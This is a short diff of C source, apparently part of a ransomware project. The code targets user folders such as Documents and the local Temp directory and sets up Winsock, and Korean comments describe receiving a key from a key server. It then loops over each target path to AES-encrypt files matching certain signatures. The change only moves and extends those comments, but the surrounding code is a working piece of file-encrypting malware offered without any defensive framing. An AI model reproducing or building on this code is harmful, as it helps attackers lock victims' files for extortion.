@@ -268,10 +268,6 @@ int main()
     wcscat(tt[2].addr, L"\\Documents\\");
     wcscat(tt[3].addr, L"\\AppData\\Local\\Temp\\");
 
-    //calldir함수를 통해 target구조체 변수 주소 받으면 tt[4]배열에 각각 Directory들 주소 저장된다.
-    //8byte 랜덤하게 생성할 키 선언 -> 키 서버를 통해 전달 받음.
-
-
 
     // Winsock 초기화
     WSADATA wsaData = { 0 };
@@ -317,8 +313,10 @@ int main()
     WSACleanup();
 
     //generateRandomKey(randomKey, sizeof(randomKey));
-
-
+    
+    //calldir함수를 통해 target구조체 변수 주소 받으면 tt[4]배열에 각각 Directory들 주소 저장된다.
+    //8byte 랜덤하게 생성할 키 선언 -> 키 서버를 통해 전달 받음.
+    //전달받은 key를 톨해서 target 경로별 각 시그니처에 맞는 파일들을 AES 암호화 진행
     for (int i = 0; i < 4; i++)
         calldir(&tt[i], randomKey);
 
